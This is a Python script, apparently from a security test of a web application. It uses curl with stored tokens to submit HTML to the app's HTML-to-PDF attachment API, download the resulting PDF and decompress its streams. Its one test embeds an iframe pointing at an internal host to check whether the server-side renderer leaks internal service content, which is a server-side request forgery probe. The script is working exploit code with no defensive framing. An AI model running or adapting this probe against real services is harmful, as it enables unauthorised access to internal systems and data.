import json,subprocess,os,re,zlib
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def render(html,name):
    c,b=req('POST','/api/v1/attachments/html',
        {"html":html,"type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":name})
    if c!='200': return c,None,b
    aid=json.loads(b)['attachmentId']
    c2,b2=req('GET',f'/api/v1/attachments/{aid}')
    fid=json.loads(b2)['attachments'][0]['file_id']
    c3,b3=req('GET',f'/api/v1/files/{fid}')
    url=json.loads(b3)['files'][0]['url']
    return c,(aid,fid,url),b
def pdftxt(url):
    subprocess.run(['curl','-s','-m','40','-o','/tmp/x.pdf',url])
    d=open('/tmp/x.pdf','rb').read()
    out=[]
    for m in re.finditer(rb'stream\r?\n(.*?)endstream', d, re.S):
        try: out.append(zlib.decompress(m.group(1)).decode('latin-1'))
        except: pass
    return '\n'.join(out)

# A: iframe internal service
html='<h1>ZXMARK</h1><iframe src="http://integrations.qa.soxhubapp.com/version" width="900" height="700"></iframe>'
c,meta,b=render(html,'zx-int1')
print("A iframe internal:",c,meta)
if meta:
    t=pdftxt(meta[2])
    print("   pdf content len:",len(t))
    print("   has ZXMARK:", 'ZXMARK' in t or '005D005B' in t)
    print("   snippet:",t[:300].replace(chr(10),' '))
